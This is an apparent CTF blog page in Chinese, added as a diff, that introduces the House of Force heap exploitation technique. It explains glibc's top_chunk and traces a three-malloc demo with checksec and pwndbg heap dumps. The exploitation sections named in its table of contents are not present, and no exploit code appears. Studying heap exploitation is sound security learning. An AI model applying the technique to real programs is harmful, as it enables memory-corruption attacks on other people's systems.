@@ -1,0 +1,566 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://idcm-svg.github.io/HFTTC.github.io';window.REIMU_CONFIG.relative = '/HFTTC.github.io/';</script>
+  <title>
+    index | SEZUVEM=&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/HFTTC.github.io/css/loader.css">
+
+    <meta name="description" content="House Of Force（topchunk）什么是 House Of Force？ _House Of Force（HoF）_的命名，核心是用「House」指代堆内存空间、「Force」指代 “强制篡改堆布局以劫持分配” 的核心攻击逻辑 。House Of Force 是一种堆的利用方法 其主要原理是控制 heap 中的 top_chunk 并 malloc 来达到控制任意内存的空间。既然是控">
+<meta property="og:type" content="article">
+<meta property="og:title" content="index">
+<meta property="og:url" content="https://idcm-svg.github.io/HFTTC.github.io/2026/04/28/PWN/PWNCTF/HouseOfForce%EF%BC%88topchunk%EF%BC%89/index/index.html">
+<meta property="og:site_name" content="SEZUVEM&#x3D;&#39;s Blog">
+<meta property="og:description" content="House Of Force（topchunk）什么是 House Of Force？ _House Of Force（HoF）_的命名，核心是用「House」指代堆内存空间、「Force」指代 “强制篡改堆布局以劫持分配” 的核心攻击逻辑 。House Of Force 是一种堆的利用方法 其主要原理是控制 heap 中的 top_chunk 并 malloc 来达到控制任意内存的空间。既然是控">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/E0LQqGr7lOYojfZw/1769761912992-8b8e0cc7-c3c6-4666-9309-be3685f119ec-375588.png">
+<meta property="article:published_time" content="2026-04-28T10:25:57.196Z">
+<meta property="article:modified_time" content="2026-04-28T11:19:30.398Z">
+<meta property="article:author" content="SEZUVEM&#x3D;">
+<meta property="article:tag" content="Pwn, CTF, Binary">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/E0LQqGr7lOYojfZw/1769761912992-8b8e0cc7-c3c6-4666-9309-be3685f119ec-375588.png">
+      <meta name="keywords" content="Pwn, CTF, Binary">
+    <link rel="alternate" href="/HFTTC.github.io/atom.xml" title="SEZUVEM='s Blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/HFTTC.github.io/images/favicon.ico">
+  
+<link rel="stylesheet" href="/HFTTC.github.io/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/HFTTC.github.io/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/HFTTC.github.io/images/banner.webp" alt="index">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">index</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#House-Of-Force%EF%BC%88topchunk%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">House Of Force（topchunk）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-House-Of-Force%EF%BC%9F"><span class="toc-number">1.1.</span> <span class="toc-text">什么是 House Of Force？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#top-chunk"><span class="toc-number">1.2.</span> <span class="toc-text">top_chunk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E5%85%A5%E5%AE%9E%E4%BE%8B-top-chunk-demo"><span class="toc-number">1.3.</span> <span class="toc-text">引入实例 top_chunk_demo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#House-Of-Force-%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="toc-number">1.4.</span> <span class="toc-text">House Of Force 利用原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#HOF-%E5%90%91%E5%89%8D%E6%8E%A7%E5%88%B6%E5%86%85%E5%AD%98"><span class="toc-number">1.4.1.</span> <span class="toc-text">HOF 向前控制内存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HOF-%E5%90%91%E5%90%8E%E6%8E%A7%E5%88%B6%E5%86%85%E5%AD%98"><span class="toc-number">1.4.2.</span> <span class="toc-text">HOF 向后控制内存</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="SEZUVEM=" class="lazyload">
+  <div class="sidebar-author-name">SEZUVEM=</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">198</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-PWN/PWNCTF/HouseOfForce（topchunk）/index" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-04-28T10:25:57.196Z" itemprop="datePublished">2026-04-28</time>
+    <time style="display: none;" id="post-update-time">2026-04-28</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="House-Of-Force（topchunk）"><a href="#House-Of-Force（topchunk）" class="headerlink" title="House Of Force（topchunk）"></a>House Of Force（topchunk）</h1><h3 id="什么是-House-Of-Force？"><a href="#什么是-House-Of-Force？" class="headerlink" title="什么是 House Of Force？"></a>什么是 House Of Force？</h3><p> _<strong>House Of Force（HoF）</strong>_的命名，核心是用「House」指代堆内存空间、「Force」指代 “强制篡改堆布局以劫持分配” 的核心攻击逻辑 。House Of Force 是一种堆的利用方法 其主要原理是控制 heap 中的 top_chunk 并 malloc 来达到控制任意内存的空间。既然是控制 top_chunk，那就先了解一下 top_chunk：</p>
+<h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top_chunk"></a>top_chunk</h3><p>top_chunk 是 glibc 的 ptmalloc 内存管理中，位于堆物理地址最高处的特殊空闲 chunk，不属于任何 bin 链表，是内存分配的 “最后备选”，还负责堆扩容与内存归还操作系统。  </p>
+<p>位置：处于堆顶，brk 指针位于其顶部，是堆中最后一块空闲块。  </p>
+<p><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">申请内存时，依次查询 tcache → fastbins → smallbins → largebins → unsorted bin。</font></p>
+<p><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">上述均无匹配时，尝试从 top_chunk 切割；若 top_chunk 不足，则调用 sysmalloc 扩容。</font></p>
+<p><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">切割后，剩余部分作为新的 top_chunk，分配部分返回给用户。</font></p>
+<h3 id="引入实例-top-chunk-demo"><a href="#引入实例-top-chunk-demo" class="headerlink" title="引入实例 top_chunk_demo"></a>引入实例 top_chunk_demo</h3><p>我们先通过一个例子去了解 top_chunk 的分配过程，之后再去讲解 HOF 的利用，这样会更清晰。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先对文件进行检查，发现什么都没有开</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ctfshow@ubuntu:~/Desktop$ checksec top_chunk_demo</span><br><span class="line">[*] <span class="string">&#x27;/home/ctfshow/Desktop/top_chunk_demo&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">ctfshow@ubuntu:~/Desktop$ </span><br></pre></td></tr></table></figure>
+
+<p>用 gdb 调试，在 main 函数下断点，运行到常见第一个堆块之后，看一下堆情况：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">In file: /home/kali/Desktop/top_chunk_demo.c:<span class="number">5</span></span><br><span class="line">   <span class="number">1</span> <span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">   <span class="number">2</span> <span class="meta">#<span class="keyword">include</span><span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line">   <span class="number">3</span> <span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">   <span class="number">4</span>         <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"> ► <span class="number">5</span>         <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">   <span class="number">6</span>         <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">   <span class="number">7</span>         <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="number">8</span> &#125; </span><br><span class="line">   <span class="number">9</span>         </span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rbp rsp <span class="number">0x7fffffffdca0</span> ◂— <span class="number">1</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│+<span class="number">008</span>     <span class="number">0x7fffffffdca8</span> —▸ <span class="number">0x7ffff7c29f68</span> (__libc_start_call_main+<span class="number">120</span>) ◂— mov edi, eax</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│+<span class="number">010</span>     <span class="number">0x7fffffffdcb0</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│+<span class="number">018</span>     <span class="number">0x7fffffffdcb8</span> —▸ <span class="number">0x400526</span> (main) ◂— push rbp</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│+<span class="number">020</span>     <span class="number">0x7fffffffdcc0</span> ◂— <span class="number">0x1ffffdda0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│+<span class="number">028</span>     <span class="number">0x7fffffffdcc8</span> —▸ <span class="number">0x7fffffffddb8</span> —▸ <span class="number">0x7fffffffe15a</span> ◂— <span class="string">&#x27;/home/kali/Desktop/top_chunk_demo&#x27;</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│+<span class="number">030</span>     <span class="number">0x7fffffffdcd0</span> —▸ <span class="number">0x7fffffffddb8</span> —▸ <span class="number">0x7fffffffe15a</span> ◂— <span class="string">&#x27;/home/kali/Desktop/top_chunk_demo&#x27;</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│+<span class="number">038</span>     <span class="number">0x7fffffffdcd8</span> ◂— <span class="number">0xf0b5c6b0a73a3ac1</span></span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► <span class="number">0</span>         <span class="number">0x400534</span> main+<span class="number">14</span></span><br><span class="line">   <span class="number">1</span>   <span class="number">0x7ffff7c29f68</span> __libc_start_call_main+<span class="number">120</span></span><br><span class="line">   <span class="number">2</span>   <span class="number">0x7ffff7c2a025</span> __libc_start_main+<span class="number">133</span></span><br><span class="line">   <span class="number">3</span>         <span class="number">0x400459</span> _start+<span class="number">41</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">Support <span class="keyword">for</span> tcache large <span class="title function_">bins</span> <span class="params">(a GLIBC <span class="number">2.42</span> addition)</span> has not been fully implemented. PR contributions are highly appreciated!</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x602000</span><br><span class="line">Size: 0<span class="title function_">x300</span> <span class="params">(with flag bits: <span class="number">0x301</span>)</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x602300</span><br><span class="line">Size: 0<span class="title function_">x20</span> <span class="params">(with flag bits: <span class="number">0x21</span>)</span></span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x602320</span><br><span class="line">Size: 0<span class="title function_">x20ce0</span> <span class="params">(with flag bits: <span class="number">0x20ce1</span>)</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x602300</span></span><br><span class="line"><span class="number">0x602300</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000021</span>==&gt;chunk1</span><br><span class="line"><span class="number">0x602310</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602320</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000020ce1</span>==&gt;top_chunk</span><br><span class="line"><span class="number">0x602330</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+
+<p>此时 top_chunk 的大小为 0x20ce1，我们再进行 malloc(0x20)看一看对快的内存大小：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">In file: /home/kali/Desktop/top_chunk_demo.c:<span class="number">6</span></span><br><span class="line">   <span class="number">1</span> <span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">   <span class="number">2</span> <span class="meta">#<span class="keyword">include</span><span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line">   <span class="number">3</span> <span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">   <span class="number">4</span>         <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="number">5</span>         <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"> ► <span class="number">6</span>         <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">   <span class="number">7</span>         <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="number">8</span> &#125;        </span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x602000</span></span><br><span class="line">Size: <span class="number">0x300</span> (with flag bits: <span class="number">0x301</span>)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x602300</span></span><br><span class="line">Size: <span class="number">0x20</span> (with flag bits: <span class="number">0x21</span>)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x602320</span></span><br><span class="line">Size: <span class="number">0x30</span> (with flag bits: <span class="number">0x31</span>)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x602350</span></span><br><span class="line">Size: <span class="number">0x20cb0</span> (with flag bits: <span class="number">0x20cb1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x602300</span></span><br><span class="line"><span class="number">0x602300</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000021</span>==&gt;chunk1</span><br><span class="line"><span class="number">0x602310</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602320</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000031</span>==&gt;chunk2</span><br><span class="line"><span class="number">0x602330</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602340</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602350</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000020cb1</span>==&gt;top_chunk</span><br><span class="line"><span class="number">0x602360</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+
+<p>对比第一次 malloc 的堆情况，我们发现，系统新开辟了一个 0x31 大小的内存空间，但是 top_chunk_size 却减小了 0x30 的大小，我们继续调试看看执行完第三次 malloc 的堆块：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">In file: /home/kali/Desktop/top_chunk_demo.c:<span class="number">7</span></span><br><span class="line">   <span class="number">1</span> <span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">   <span class="number">2</span> <span class="meta">#<span class="keyword">include</span><span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line">   <span class="number">3</span> <span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">   <span class="number">4</span>         <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="number">5</span>         <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">   <span class="number">6</span>         <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line"> ► <span class="number">7</span>         <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="number">8</span> &#125; </span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x602000</span></span><br><span class="line">Size: <span class="number">0x300</span> (with flag bits: <span class="number">0x301</span>)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x602300</span></span><br><span class="line">Size: <span class="number">0x20</span> (with flag bits: <span class="number">0x21</span>)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x602320</span></span><br><span class="line">Size: <span class="number">0x30</span> (with flag bits: <span class="number">0x31</span>)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x602350</span></span><br><span class="line">Size: <span class="number">0x40</span> (with flag bits: <span class="number">0x41</span>)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x602390</span></span><br><span class="line">Size: <span class="number">0x20c70</span> (with flag bits: <span class="number">0x20c71</span>)</span><br></pre></td></tr></table></figure>
+
